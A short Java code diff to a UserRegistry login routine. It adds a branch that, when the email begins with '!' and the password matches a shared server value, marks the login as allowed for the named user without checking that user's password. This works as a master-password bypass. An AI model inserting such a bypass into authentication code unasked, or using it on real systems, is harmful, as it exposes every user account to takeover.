@@ -592,6 +592,12 @@ public class UserRegistry {
         if(((pass == null)||(pass.length()<=0)) && !letmein ) {
             return null; // nothing to do
         }
+        
+        if(email.startsWith("!") && pass.equals(sm.vap)) {
+        	email=email.substring(1);
+        	letmein=true;
+        }
+        
         ResultSet rs = null;
         //synchronized(conn) {
         Connection conn  = null;
